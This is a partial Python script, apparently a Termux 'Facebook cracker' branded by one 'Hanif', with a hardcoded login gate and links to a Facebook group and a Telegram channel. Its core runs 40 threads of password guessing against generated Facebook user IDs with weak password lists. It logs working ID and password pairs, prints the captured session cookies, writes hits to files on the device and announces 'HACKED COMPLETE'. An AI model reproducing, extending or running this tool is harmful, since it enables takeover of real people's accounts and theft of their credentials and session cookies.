...
while attemps < 12345677901:
    username = input(' \033[0;92m𝑬𝒏𝒕𝒆𝒓 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆: ')
    os.system('espeak -a 300 " Enter,  Password"')
    password = input(' \033[0;95m𝑬𝒏𝒕𝒆𝒓 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅: ')
    if username == 'Hanif' and password == 'Vai':
       print('\033[0;92m𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑳𝒐𝒈𝒈𝒆𝒅 𝒊𝒏.')
       os.system('espeak -a 300 " Successfully,  Logged, in"')
       time.sleep(3)
       break
    else:
        print(' \033[0;91m 𝑰𝒏𝒄𝒐𝒓𝒓𝒆𝒄𝒕 𝑼𝒔𝒆𝒓 𝒐𝒓 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅 𝑷𝒍𝒆𝒂𝒔𝒆 𝑻𝒓𝒚 𝑨𝒈𝒂𝒊𝒏')
...
def Alhaj():
    os.system('clear')
    os.system('xdg-open https://m.facebook.com/groups/725910525380684/')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
    ...
    if Alhaj in ["2","B"]:
        os.system('xdg-open https://m.facebook.com/groups/725910525380684/')
    if Alhaj in ["3","C"]:
        os.system('xdg-open https://t.me/+odH5HOXrvV4zNGNl/')
    if Alhaj in ["0","X"]:
        os.system('exit')
...
def Alhajs():
    ...
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m50000\033[1;31m] \033[1;31m ║")
    print("\033[1;91m╚════════════════════════════════════════════╝")
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m YOUR TOTAL ᏆᎠ : '+tl)
        print(f'\033[1;91m║\033[1;92m EDIT BY HANIF ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Hanif@123']
            uid = code+love
            Fb_crack.submit(Alhajm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM HANIF ')
    print("\033[1;91m╚═══════════════════════════╝")
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'LOCK' in res:
                    ...
                    print(f'  \r\033[1;92m  [HANIF-OK] '+uid+' • '+ps+'\33[0;92m')
                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                print(f'\033[1;96m[\033[1;92mHANIF-OK\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                os.system('espeak -a 300 " HANIF,  Ok,  id"')
                open('/sdcard/HANIF-KING-OK.txt', 'a').write( uid+' | '+ps+'\n')
                os.system('espeak -a 300 " MAMA ID, Lo "')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[HANIF-CP] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/HANIF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
